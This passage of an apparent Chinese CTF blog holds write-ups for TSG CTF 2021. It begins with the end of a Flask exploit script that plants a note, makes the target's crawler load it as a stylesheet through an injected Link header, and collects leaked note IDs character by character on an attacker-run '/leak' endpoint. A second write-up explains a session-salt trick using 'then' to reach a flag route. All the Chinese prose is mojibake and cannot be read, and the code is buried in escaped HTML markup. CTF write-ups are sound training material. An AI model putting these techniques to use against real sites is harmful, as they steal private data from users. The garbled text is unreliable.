&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;title&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;description&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Location&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">header_value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;gt;; rel=&amp;#34;stylesheet&amp;#34;; type=&amp;#34;text/css&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/tell&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;path&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;/?k=Link&amp;amp;v=&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">header_value&lt;/span>&lt;span style="color:#111">)),&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/start&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: started exploit with a new note: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/leak&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">leak&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">LEAK_LENGTH&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] leaked (full ID): &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] leaked: &lt;/span>&lt;span style="color:#d88200">{}{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))))&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: invoked crawler with a new note: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] running app ...&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯¦ç»†å†…å®¹å‚è§-&amp;gt;&lt;a href="https://diary.shift-js.info/tsgctf-2021-udon/">wp&lt;/a>&lt;/p>
&lt;h2 id="webbeginners-web-2021">Web/Beginner&amp;rsquo;s Web 2021&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Made drunk, so solved drunk.&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080745266.png" alt="image-20211004080745266">&lt;/p>
&lt;p>ç»™äº†æºç ï¼Œçœ‹ä¸‹index.jsï¼Œemmmmmmï¼Œåˆ›å»ºäº†session.routes&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004081546667.png" alt="image-20211004081546667">&lt;/p>
&lt;p>ä½†æ˜¯flagå¹¶ä¸ä¼šåœ¨æœ€åŽæ¸²æŸ“çš„routeä¸­å‡ºçŽ°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004092636947.png" alt="image-20211004092636947">&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬æƒ³åˆ©ç”¨GetSaltå¤„çš„&lt;code>session.salt='flag'&lt;/code>æ¥è½¬åˆ°flagçš„è·¯ç”±ä¸Šæ¥èŽ·å¾—flag&lt;/p>
&lt;p>ä½†æ˜¯[salt]ä¼šå¯¼è‡´é‡å†™flagï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦çš„sessionæ˜¯è¿™æ ·çš„çŠ¶æ€&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// salt is anything different from &amp;#39;flag&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>é¦–å…ˆç”¨&lt;code>GET /?action=SetSalt&amp;amp;data=flag&lt;/code>æ¥è®©&lt;code>salt='flag'&lt;/code>ï¼Œsessionä¼šå˜æˆè¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// this route is overwritten and not accessible
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// here is salt
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬æƒ³å›žå¤åˆ°routeåªæœ‰ä¸€ä¸ªflagå¹¶ä¸”å¯è¾¾çš„çŠ¶æ€ï¼Œä½†æ˜¯åˆä¸æƒ³åˆ é™¤æŽ‰&lt;code>salt: 'flag'&lt;/code>&lt;/p>
&lt;p>å…³é”®ä¹‹å¤„åœ¨äºŽ&lt;code>set_salt&lt;/code>ï¼Œå®ƒæƒ³å®Œæˆçš„ä»»åŠ¡æ˜¯ä¸€èµ·æ›´æ–°routeså’Œsaltçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒè¡Œä¸­ï¼Œæˆ‘ä»¬è¦&lt;code>await setRoutes&lt;/code>ï¼Œç›¸å½“äºŽ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œä¼šè¦åˆ°ä¸€ä¸ªsetRoutesçš„è¿”å›žå€¼result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">// redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾ˆæ²¡å¿…è¦çš„æ“ä½œï¼Œåˆä¸€ésetRoutesï¼Œçº¯å±žè„±è£¤å­æ”¾å±&lt;/p>
&lt;p>å½“æˆ‘ä»¬è®¾ç½®&lt;code>salt = 'then'&lt;/code>æ—¶ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">//redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªç‰¹æ®Šçš„thenå…³é”®å­—ä¸€å‡ºæ¥ï¼Œå°±å¾ˆç‰¹æ®Šï¼Œè§£é‡Šå™¨ä¼šè¯•å›¾æŠŠå®ƒè®¤ä½œæ˜¯awaitä¸­è¦è°ƒç”¨çš„thençš„éƒ¨åˆ†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰awaitéœ€è¦å®ƒè¿™ä¸ªthenæ‰§è¡Œçš„resultæ¥ä½œä¸ºè¿”å›žå€¼ï¼Œå°±å¡æ­»åœ¨è¿™é‡Œäº†ï¼Œè¿™ä¸ªsaltæ— å¤„å¯åŽ»&lt;/p>
&lt;p>Soï¼Œ&lt;code>GET /?action=SetSalt&amp;amp;data=then&lt;/code>ä¹‹åŽsessionå°†æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åªè¦&lt;code>GET /?action=GetSalt&lt;/code>å³å¯ï¼Œå› ä¸º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// route = session.salt here (just flag)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…·ä½“æ“ä½œä¸€å¼ åŠ¨å›¾å°±èƒ½è¯´æ¸…æ¥š&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8q7R2If.gif" alt="img">&lt;/p>
